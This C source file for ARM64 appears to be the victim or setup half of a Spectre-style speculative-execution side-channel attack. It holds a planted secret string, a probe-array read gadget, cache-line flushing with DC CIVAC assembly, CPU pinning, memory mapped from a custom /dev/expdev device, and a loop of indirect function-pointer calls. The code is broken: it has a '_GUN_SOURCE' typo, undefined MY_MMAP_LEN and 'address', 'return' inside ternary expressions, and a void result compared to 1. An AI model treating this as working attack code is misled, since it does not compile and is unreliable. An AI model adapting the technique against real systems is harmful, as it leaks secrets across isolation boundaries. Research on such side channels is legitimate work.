#define _GUN_SOURCE

#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdint.h>
#include <sys/shm.h>

char secret[] = "this is secret son";
char temp_probe[256*512] = {'a'};
char *probe;

volatile int tmp;
volatile int index_probe;

char *shm;

void target(){
    tmp = 0;
}

void gadget(){
    tmp = probe[10*512];
}

static inline void flush(void *addr) {
	asm volatile ("DC CIVAC, %[ad]" : : [ad] "r" (addr));
	asm volatile("DSB SY");
}

void init_shm(){
    int shmid;

    shmid = shmget( (key_t)9704, 256*512, 0666|IPC_CREAT );

    if(shmid == -1){
        //fprintf(stderr, "shmget failed\n");
        printf("shmget faild");
        exit(EXIT_FAILURE);
    }

    shm = shmat(shmid, 0, 0);

    if( shm == (void *)-1 ){
        printf("shmget faild");
        exit(EXIT_FAILURE);
    }

    memset(shm, 'x', 0x10000);
}

int init_shared_memory(){
    int fd;

    fd = open("/dev/expdev", O_RDWR);
    if(fd < 0){
        perror("Open call failed");
        return -1;
    }
    probe = mmap( NULL, MY_MMAP_LEN * PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (address == MAP_FAILED){
        perror("mmap operation failed");
        return -1;
    }

    return 1;
}

void setcpu(int cpu){
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(getpid() , sizeof(mask), &mask);
}

int main(){
    setcpu(7);

    init_shm() != 1 ? return -1 : 1 ;

    init_shared_memory() != 1 ? return -1 : 1;

    for(int i = 0; i < 256; i++){
        flush(&shm[address*512]);
    }

    asm("isb sy");
    
    while(1){
        void(*p)();
        p = target;
        p();
    }
}